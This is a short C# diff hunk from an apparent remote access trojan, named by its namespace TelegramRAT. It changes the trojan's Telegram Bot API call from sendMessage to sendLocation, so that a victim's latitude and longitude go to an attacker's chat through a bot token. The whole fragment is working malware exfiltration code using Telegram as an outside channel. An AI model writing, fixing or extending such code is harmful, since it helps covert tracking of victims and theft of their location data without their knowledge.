@@ -128,7 +128,7 @@ namespace TelegramRAT
             Bot.DownloadString(
                 "https://api.telegram.org/bot" +
                 config.TelegramToken +
-                "/sendMessage" +
+                "/sendLocation" +
                 "?chat_id=" + config.TelegramChatID +
                 "&latitude=" + lat +
                 "&longitude=" + lon
